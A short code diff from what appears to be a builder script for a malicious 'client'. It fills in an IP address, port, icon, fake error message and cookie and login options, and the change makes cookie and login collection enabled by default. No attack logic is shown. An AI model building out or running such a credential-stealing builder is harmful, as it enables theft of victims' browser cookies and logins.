@@ -92,9 +92,9 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
             "<<ERROR_BOOL>>", "true" if error_bool else "false")
         content = content.replace("<<ERROR_MESSAGE>>", error_message)
         content = content.replace(
-            "<<COOKIES_BOOL>>", "true" if nocookies else "false")
+            "<<COOKIES_BOOL>>", "true" if not nocookies else "false")
         content = content.replace(
-            "<<LOGIN_BOOL>>", "true" if nologin else "false")
+            "<<LOGIN_BOOL>>", "true" if not nologin else "false")
         content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
